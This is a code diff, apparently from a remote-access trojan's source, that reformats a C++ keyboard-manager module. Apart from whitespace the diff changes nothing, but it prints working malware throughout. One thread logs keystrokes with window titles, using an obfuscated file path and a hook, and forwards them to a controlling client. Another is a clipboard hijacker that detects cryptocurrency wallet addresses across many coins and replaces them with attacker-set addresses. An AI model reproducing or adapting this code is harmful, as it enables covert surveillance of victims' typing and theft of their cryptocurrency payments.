@@ -40,13 +40,13 @@ CKeyboardManager1::CKeyboardManager1(IOCPClient*pClient, int offline, void* user
     m_bIsOfflineRecord = offline;
 
     char path[MAX_PATH] = { "C:\\Windows\\" };
-	GET_FILEPATH(path, skCrypt(KEYLOG_FILE));
+    GET_FILEPATH(path, skCrypt(KEYLOG_FILE));
     strcpy_s(m_strRecordFile, path);
     m_Buffer = new CircularBuffer(m_strRecordFile);
 
     m_bIsWorking = true;
-	iniFile cfg(CLIENT_PATH);
-	m_Wallet = StringToVector(cfg.GetStr("settings", "wallet", ""), ';', MAX_WALLET_NUM);
+    iniFile cfg(CLIENT_PATH);
+    m_Wallet = StringToVector(cfg.GetStr("settings", "wallet", ""), ';', MAX_WALLET_NUM);
 
     m_hClipboard = __CreateThread(NULL, 0, Clipboard, (LPVOID)this, 0, NULL);
     m_hWorkThread = __CreateThread(NULL, 0, KeyLogger, (LPVOID)this, 0, NULL);
@@ -67,13 +67,14 @@ CKeyboardManager1::~CKeyboardManager1()
     delete m_Buffer;
 }
 
-void CKeyboardManager1::Notify() {
+void CKeyboardManager1::Notify()
+{
     if (NULL == this)
         return;
-    
+
     m_mu.Lock();
-	iniFile cfg(CLIENT_PATH);
-	m_Wallet = StringToVector(cfg.GetStr("settings", "wallet", ""), ';', MAX_WALLET_NUM);
+    iniFile cfg(CLIENT_PATH);
+    m_Wallet = StringToVector(cfg.GetStr("settings", "wallet", ""), ';', MAX_WALLET_NUM);
     m_mu.Unlock();
     sendStartKeyBoard();
     WaitForDialogOpen();
@@ -97,11 +98,12 @@ void CKeyboardManager1::OnReceive(LPBYTE lpBuffer, ULONG nSize)
     }
 }
 
-std::vector<std::string> CKeyboardManager1::GetWallet() {
-	m_mu.Lock();
-	auto w = m_Wallet;
-	m_mu.Unlock();
-	return w;
+std::vector<std::string> CKeyboardManager1::GetWallet()
+{
+    m_mu.Lock();
+    auto w = m_Wallet;
+    m_mu.Unlock();
+    return w;
 }
 
 int CKeyboardManager1::sendStartKeyBoard()
@@ -429,7 +431,7 @@ BOOL CKeyboardManager1::IsWindowsFocusChange(HWND &PreviousFocus, TCHAR *WindowC
                 SYSTEMTIME   s;
                 GetLocalTime(&s);
                 sprintf(szText, _T("\r\n[标题:] %s\r\n[时间:]%d-%02d-%02d  %02d:%02d:%02d\r\n"),
-                    WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
+                        WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
             }
             memset(WindowCaption, 0, CAPTION_SIZE);
             ReturnFlag=TRUE;
@@ -464,65 +466,67 @@ DWORD WINAPI CKeyboardManager1::SendData(LPVOID lparam)
 }
 
 
-int CALLBACK WriteBuffer(const char* record, void* user) {
+int CALLBACK WriteBuffer(const char* record, void* user)
+{
     CircularBuffer* m_Buffer = (CircularBuffer*)user;
     m_Buffer->Write(record, strlen(record));
-	return 0;
+    return 0;
 }
 
-DWORD WINAPI CKeyboardManager1::Clipboard(LPVOID lparam) {
-	CKeyboardManager1* pThis = (CKeyboardManager1*)lparam;
-	while (pThis->m_bIsWorking) {
-		auto w = pThis->GetWallet();
-		if (!w.empty() && clip::has(clip::text_format())) {
-			std::string value;
-			clip::get_text(value);
+DWORD WINAPI CKeyboardManager1::Clipboard(LPVOID lparam)
+{
+    CKeyboardManager1* pThis = (CKeyboardManager1*)lparam;
+    while (pThis->m_bIsWorking) {
+        auto w = pThis->GetWallet();
+        if (!w.empty() && clip::has(clip::text_format())) {
+            std::string value;
+            clip::get_text(value);
             if (value.length() > 200) {
                 Sleep(1000);
                 continue;
             }
-			auto type = detectWalletType(value);
-			switch (type) {
+            auto type = detectWalletType(value);
+            switch (type) {
             case WALLET_UNKNOWN:
                 break;
-			case WALLET_BTC_P2PKH:
-			case WALLET_BTC_P2SH:
-			case WALLET_BTC_BECH32:
-				if (!w[ADDR_BTC].empty()) clip::set_text(w[ADDR_BTC]);
-				break;
-			case WALLET_ETH_ERC20:
-				if (!w[ADDR_ERC20].empty()) clip::set_text(w[ADDR_ERC20]);
-				break;
-			case WALLET_USDT_OMNI:
-				if (!w[ADDR_OMNI].empty()) clip::set_text(w[ADDR_OMNI]);
-				break;
-			case WALLET_USDT_TRC20:
-				if (!w[ADDR_TRC20].empty()) clip::set_text(w[ADDR_TRC20]);
-				break;
-			case WALLET_TRON:
-				if (!w[ADDR_TRON].empty()) clip::set_text(w[ADDR_TRON]);
-				break;
-			case WALLET_SOLANA:
-				if (!w[ADDR_SOL].empty()) clip::set_text(w[ADDR_SOL]);
-				break;
-			case WALLET_XRP:
-				if (!w[ADDR_XRP].empty()) clip::set_text(w[ADDR_XRP]);
-				break;
-			case WALLET_POLKADOT:
-				if (!w[ADDR_DOT].empty()) clip::set_text(w[ADDR_DOT]);
-				break;
-			case WALLET_CARDANO_SHELLEY:
-			case WALLET_CARDANO_BYRON:
-				if (!w[ADDR_ADA].empty()) clip::set_text(w[ADDR_ADA]);
-				break;
-			case WALLET_DOGE:
-				if (!w[ADDR_DOGE].empty()) clip::set_text(w[ADDR_DOGE]);
-				break;
-			}
-		}
+            case WALLET_BTC_P2PKH:
+            case WALLET_BTC_P2SH:
+            case WALLET_BTC_BECH32:
+                if (!w[ADDR_BTC].empty()) clip::set_text(w[ADDR_BTC]);
+                break;
+            case WALLET_ETH_ERC20:
+                if (!w[ADDR_ERC20].empty()) clip::set_text(w[ADDR_ERC20]);
+                break;
+            case WALLET_USDT_OMNI:
+                if (!w[ADDR_OMNI].empty()) clip::set_text(w[ADDR_OMNI]);
+                break;
+            case WALLET_USDT_TRC20:
+                if (!w[ADDR_TRC20].empty()) clip::set_text(w[ADDR_TRC20]);
+                break;
+            case WALLET_TRON:
+                if (!w[ADDR_TRON].empty()) clip::set_text(w[ADDR_TRON]);
+                break;
+            case WALLET_SOLANA:
+                if (!w[ADDR_SOL].empty()) clip::set_text(w[ADDR_SOL]);
+                break;
+            case WALLET_XRP:
+                if (!w[ADDR_XRP].empty()) clip::set_text(w[ADDR_XRP]);
+                break;
+            case WALLET_POLKADOT:
+                if (!w[ADDR_DOT].empty()) clip::set_text(w[ADDR_DOT]);
+                break;
+            case WALLET_CARDANO_SHELLEY:
+            case WALLET_CARDANO_BYRON:
+                if (!w[ADDR_ADA].empty()) clip::set_text(w[ADDR_ADA]);
+                break;
+            case WALLET_DOGE:
+                if (!w[ADDR_DOGE].empty()) clip::set_text(w[ADDR_DOGE]);
+                break;
+            }
+        }
         Sleep(1000);
-	}
-	return 0x20251005;
+    }
+    return 0x20251005;
 }
 
 DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
@@ -530,29 +534,29 @@ DWORD WINAPI CKeyboardManager1::KeyLogger(LPVOID lparam)
     CKeyboardManager1 *pThis = (CKeyboardManager1 *)lparam;
     MSG msg;
     TCHAR KeyBuffer[2048] = {};
-	TCHAR szText[CAPTION_SIZE] = {};
+    TCHAR szText[CAPTION_SIZE] = {};
     TCHAR WindowCaption[CAPTION_SIZE] = {};
     HWND PreviousFocus = NULL;
     GET_PROCESS(DLLS[USER32], GetAsyncKeyState);
     while(pThis->m_bIsWorking) {
-		if (!pThis->IsConnected() && !pThis->m_bIsOfflineRecord) {
+        if (!pThis->IsConnected() && !pThis->m_bIsOfflineRecord) {
 #if USING_KB_HOOK
             ReleaseHook();
 #endif
-			Sleep(1000);
-			continue;
-		}
+            Sleep(1000);
+            continue;
+        }
         Sleep(5);
 #if USING_KB_HOOK
-		if (!SetHook(WriteBuffer, pThis->m_Buffer)) {
-			return -1;
-		}
-		while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE));
+        if (!SetHook(WriteBuffer, pThis->m_Buffer)) {
+            return -1;
+        }
+        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE));
 #else
         int num = lstrlen(KeyBuffer);
         if (pThis->IsWindowsFocusChange(PreviousFocus, WindowCaption, szText, num > 0) || num > 2000) {
             bool newWindowInput = strlen(szText);
-            if (newWindowInput){// 在新的窗口有键盘输入
+            if (newWindowInput) { // 在新的窗口有键盘输入
                 lstrcat(KeyBuffer, szText);
                 memset(szText, 0, sizeof(szText));
             }
